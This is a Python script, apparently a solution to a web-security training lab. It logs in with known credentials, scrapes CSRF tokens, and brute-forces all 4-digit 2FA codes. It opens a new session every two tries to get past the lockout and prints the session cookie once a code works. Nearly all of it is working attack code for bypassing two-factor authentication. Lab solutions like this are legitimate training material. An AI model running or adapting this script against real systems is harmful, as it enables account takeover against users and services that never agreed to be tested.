#! /usr/bin/env python3
import requests
import re


# GET request to login page
    # Retrieve session cookie
    # Retrieve CSRF token

# Use the new session cookie & CSRF token to launch a POST request
    # Retrieve session cookie
    # Follow redirect with the new session cookie
    # Retrieve the CSRF token

# POST request to bruteforce the 2FA with new session and CSRF

def bruteforce_2fa(code):
    # No need to retrieve session with requests.Session()
    # Persist cookies and update cookies across requests made in the session
    s = requests.Session() 
    url = "https://acaa1f921f0df732806f7f0200e900a2.web-security-academy.net/"

    r = s.get(url + "login")
    # print(s.cookies)
    csrf = re.search(r'name="csrf" value="(.*?)">',r.text).group(1)

    r = s.post(url + "login", data = {"csrf":csrf, "username":"carlos", "password":"montoya"})
    # print(s.cookies)
    csrf = re.search(r'name="csrf" value="(.*?)">',r.text).group(1)

    for i in range(code, code+2):
        fcode = "{:04}".format(i)
        r = s.post(url + "login2", data = {"csrf":csrf, "mfa-code": fcode})
        if 'Incorrect security code' not in r.text:
            print(s.cookies)
            print(csrf)
            print(fcode)
            print(r.text)
            s.get(url + "my-account?id=carlos")
            return True
        else:
            print('Incorrect security code: ', fcode)

    return False

if __name__ == "__main__":
    i = 0
    while i < 10000:
        found = bruteforce_2fa(i)
        if found:
            break 
        else:
            i += 2

# Note, threading is not possible because we are bruteforcing 2FA of the same user account. 
# Logging in to the user account on one thread will invalidate the same user’s other sessions on other thread.
